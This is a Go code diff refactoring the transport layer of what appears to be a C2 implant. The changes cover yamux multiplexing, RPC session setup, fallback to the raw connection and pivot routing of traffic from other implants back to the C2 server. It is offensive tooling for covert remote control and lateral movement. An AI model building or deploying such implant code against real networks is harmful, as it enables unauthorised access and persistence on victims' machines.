@@ -72,8 +72,6 @@ type Transport struct {
 	// we use the Router to connect, specify the wished route of the connection, and pipe.
 	// Therefore, here the Router is in a client position most of the time.
 	Router *bon.Bon
-
-	Inbound chan net.Conn
 }
 
 // NewTransport - Eventually, we should have all supported transport transports being
@@ -187,14 +185,17 @@ ConnLoop:
 	// If the underlying protocol stack allows us to do stream mux, set it up.
 	// If not, all C2 RPC layer is already set for this transport.
 	if t.IsMux {
-		err = t.setupMultiplexer()
+		// The C2 server is here the yamux.Client requiring to open a session.
+		t.Multiplexer, err = yamux.Server(t.Conn, nil)
 		if err != nil {
-			t.phyConnFallBack() // Fallback to RPC around physical conn
-		}
-
-		// If everything is fine, setup RPC C2 code over a muxed stream.
-		if err == nil {
-			t.SetupMuxC2() // This function handles all errors and edge cases.
+			// {{if .Config.Debug}}
+			log.Printf("[mux] Error setting up Multiplexer server: %s", err)
+			// {{end}}
+			t.phyConnFallBack()
+		} else {
+			// If everything is fine, setup RPC C2 code over a muxed stream.
+			// This function handles all errors and edge cases.
+			t.setupMuxC2()
 		}
 	}
 
@@ -210,7 +211,7 @@ ConnLoop:
 }
 
 // StartMuxPivot - Given a physical connection as parameter, we setup multiplexing,
-func (t *Transport) StartMuxPivot(conn net.Conn) (err error) {
+func (t *Transport) StartMuxPivot(conn net.Conn, routeID uint32) (err error) {
 
 	t.Conn = conn
 
@@ -223,6 +224,12 @@ func (t *Transport) StartMuxPivot(conn net.Conn) (err error) {
 		// {{end}}
 		return
 	}
+	// {{if .Config.Debug}}
+	log.Printf("Transport %d set up and running (%s <- %s)", t.ID, t.Conn.LocalAddr(), t.Conn.RemoteAddr())
+	// {{end}}
+
+	// The first stream is the pivoted implant registering and speaking RPC.
+	go t.handleReverseC2(routeID)
 
 	return
 }
@@ -232,7 +239,7 @@ func (t *Transport) StartMuxPivot(conn net.Conn) (err error) {
 // This function will probably be rewritten, given that transports will have to handle
 // various types of traffic like UDP connections, and that routing will have to be efficient
 // for those as well.
-func (t *Transport) HandleReverseC2(routeID uint32) (err error) {
+func (t *Transport) handleReverseC2(routeID uint32) (err error) {
 	// As the server is a client when setting up C2 RPC stream, we act as the server
 	// and request to open a stream. The pivoted implant is listening for this.
 	src, err := t.Multiplexer.Open()
@@ -262,59 +269,8 @@ func (t *Transport) HandleReverseC2(routeID uint32) (err error) {
 	return
 }
 
-// StartFromConn - A net.Conn has been created out of a listener, and we
-// setup multiplexing infrastructure around it, without any RPC layer added.
-// This is used when this implant has a pivot listener started, and simply
-// needs to route the traffic coming from the pivoted implant.
-func (t *Transport) StartFromConn(conn net.Conn) (err error) {
-
-	// We fill details on this Transport
-
-	// {{if .Config.Debug}}
-	log.Printf("New transport from incoming connection (<- %s)", conn.RemoteAddr())
-	// {{end}}
-
-	// Inbound/outbound streams are initialized
-	t.Inbound = make(chan net.Conn, 100)
-
-	t.Multiplexer, err = yamux.Client(conn, nil)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("[mux] Error setting up Multiplexer client: %s", err)
-		// {{end}}
-	}
-
-	// As the server is a client when setting up C2 RPC stream, we act as the server
-	// and request to open a stream. The pivoted implant is listening for this.
-	stream, err := t.Multiplexer.Open()
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("[mux] Error opening C2 stream: %s", err)
-		// {{end}}
-		return
-	}
-	t.Inbound <- stream // The stream will be routed back to server.
-	// {{if .Config.Debug}}
-	log.Printf("Transport %d set up and running (%s <- %s)", t.ID, t.Conn.LocalAddr(), t.Conn.RemoteAddr())
-	// {{end}}
-
-	return
-
-}
-
-func (t *Transport) setupMultiplexer() (err error) {
-	// The C2 server is here the yamux.Client requiring to open a session.
-	t.Multiplexer, err = yamux.Server(t.Conn, nil)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("[mux] Error setting up Multiplexer server: %s", err)
-		// {{end}}
-	}
-	return
-}
-
-// SetupMuxC2 - The transport waits for the server to mux the first stream and handles any error.
-func (t *Transport) SetupMuxC2() (err error) {
+// setupMuxC2 - The transport waits for the server to mux the first stream and handles any error.
+func (t *Transport) setupMuxC2() (err error) {
 	// We wait for the first stream being instantiated over the connection
 	// and add the RPC layer to it. If an error arises or if we timeout, we
 	// fall back to wrapping the RPC around the transport's physical conn.
@@ -336,7 +292,7 @@ func (t *Transport) SetupMuxC2() (err error) {
 
 	select {
 	case stream := <-inbound:
-		t.C2, err = t.setupC2RPC(stream)
+		t.C2, err = t.setupSessionRPC(stream)
 		if err != nil {
 			// {{if .Config.Debug}}
 			log.Printf("Error: setting RPC C2: %s", err)
@@ -354,9 +310,9 @@ func (t *Transport) SetupMuxC2() (err error) {
 	return
 }
 
-// setupC2RPC - Adds the RPC layer to the Transport, so that implant can talk to C2 server.
+// setupSessionRPC - Adds the RPC layer to the Transport, so that implant can talk to C2 server.
 // The stream parameter is not "tracked" or "registered" by ourselves, but we should need to.
-func (t *Transport) setupC2RPC(stream net.Conn) (c2 *Connection, err error) {
+func (t *Transport) setupSessionRPC(stream net.Conn) (c2 *Connection, err error) {
 
 	if stream == nil {
 		return nil, errors.New("Attempted to setup RPC layer around nil net.Conn")
@@ -405,6 +361,37 @@ func (t *Transport) setupC2RPC(stream net.Conn) (c2 *Connection, err error) {
 	// {{if .Config.Debug}}
 	log.Printf("Done creating RPC C2 stream.")
 	// {{end}}
+
+	return
+}
+
+// In case we failed to use multiplexing infrastructure, we call here
+// to downgrade to RPC over the transport's physical connection.
+func (t *Transport) phyConnFallBack() (err error) {
+
+	// {{if .Config.Debug}}
+	log.Printf("[mux] falling back on RPC around physical conn")
+	// {{end}}
+
+	// First make sure all mux code is cleanup correctly.
+	if t.Multiplexer != nil {
+		err = t.Multiplexer.GoAway()
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("[mux] Error sending GoAway: %s", err)
+			// {{end}}
+		}
+
+		err = t.Multiplexer.Close()
+		// {{if .Config.Debug}}
+		log.Printf("[mux] Error closing session: %s", err)
+		// {{end}}
+
+		t.IsMux = false
+	}
+
+	// Wrap RPC layer around physical conn.
+	t.C2, err = t.setupSessionRPC(t.Conn)
 
 	return
 }
@@ -461,8 +448,8 @@ func (t *Transport) HandleRouteConn(route *pb.Route, src net.Conn) error {
 
 	var routeID bon.Route = bon.Route(route.ID)
 
-	// If we are the last node in the chain, we directly dial other hosts
-	// on this implant's host subnet.
+	// If we are the last node in the chain, we directly
+	// dial other hosts on this implant's host subnet.
 	if len(route.Nodes) == 1 {
 
 	} else if len(route.Nodes) > 1 {
@@ -489,37 +476,6 @@ func (t *Transport) HandleRouteConn(route *pb.Route, src net.Conn) error {
 	}
 
 	return nil
-}
-
-// In case we failed to use multiplexing infrastructure, we call here
-// to downgrade to RPC over the transport's physical connection.
-func (t *Transport) phyConnFallBack() (err error) {
-
-	// {{if .Config.Debug}}
-	log.Printf("[mux] falling back on RPC around physical conn")
-	// {{end}}
-
-	// First make sure all mux code is cleanup correctly.
-	if t.Multiplexer != nil {
-		err = t.Multiplexer.GoAway()
-		if err != nil {
-			// {{if .Config.Debug}}
-			log.Printf("[mux] Error sending GoAway: %s", err)
-			// {{end}}
-		}
-
-		err = t.Multiplexer.Close()
-		// {{if .Config.Debug}}
-		log.Printf("[mux] Error closing session: %s", err)
-		// {{end}}
-
-		t.IsMux = false
-	}
-
-	// Wrap RPC layer around physical conn.
-	t.C2, err = t.setupC2RPC(t.Conn)
-
-	return
 }
 
 // IsRouting - The transport checks if it is routing traffic that does not originate from this implant.
